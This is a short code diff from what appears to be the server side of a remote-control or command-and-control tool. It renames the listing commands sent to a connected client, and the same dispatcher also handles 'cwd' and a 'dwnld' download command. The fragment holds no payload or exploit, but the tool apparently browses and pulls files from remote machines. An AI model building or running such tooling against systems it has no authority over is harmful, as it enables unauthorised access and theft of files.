@@ -328,10 +328,10 @@ def send_command(client, Id):
             elif command == 'cwd':
                 client.send(command.encode())
                 get_cwd(client=client)
-            elif command == 'ls -cwd':
+            elif command == 'ls_cwd':
                 client.send(command.encode())
                 list_cwd(client=client)
-            elif command == 'ls -dir':
+            elif command == 'ls_dir':
                 client.send(command.encode())
                 list_dir(client=client)
             elif command == 'dwnld':
